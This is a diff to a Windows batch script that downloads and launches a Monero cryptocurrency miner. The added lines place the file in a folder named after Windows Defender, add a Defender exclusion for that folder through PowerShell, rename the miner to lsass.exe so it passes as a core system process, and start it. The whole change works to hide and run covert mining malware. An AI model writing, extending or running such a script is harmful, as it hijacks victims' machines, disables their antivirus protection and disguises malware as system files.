@@ -1,17 +1,18 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Set the download location
-set "folderPath=%USERPROFILE%\Program Files (x86)\Windows Defender"
-mkdir "%folderPath%"
+:: Set the download location for the executable
+set "folderPath=C:\Program Files (x86)\Windows Defender"
 
-:: Debugging: Check folder creation status
-if exist "%folderPath%" (
-    echo Folder created successfully: "%folderPath%"
-) else (
-    echo Failed to create folder: "%folderPath%"
-    exit /b 1
+:: Check if the folder exists, and create it if it doesn't
+if not exist "%folderPath%" (
+    echo Folder does not exist, creating it...
+    mkdir "%folderPath%"
 )
+
+:: Add exclusion for Windows Defender
+echo Adding exclusion for folder: "%folderPath%"
+powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
 
 :: Debugging: Attempt to download the Monero miner executable
 echo Downloading miner executable...
@@ -27,7 +28,7 @@ if %errorlevel% neq 0 (
 )
 
 :: Debugging: Verify the file exists and check its size
-if exist "%folderPath%\LulzalotWasHere.exe" (
+if exist "%folderPath%\lsass.exe" (
     for %%F in ("%folderPath%\lsass.exe") do (
         set filesize=%%~zF
     )
@@ -43,7 +44,7 @@ if exist "%folderPath%\LulzalotWasHere.exe" (
     exit /b 1
 )
 
-:: Debugging: Confirm that the miner can be run
+:: Run the downloaded executable directly
 echo Running the Monero miner...
 start "" "%folderPath%\lsass.exe"
 
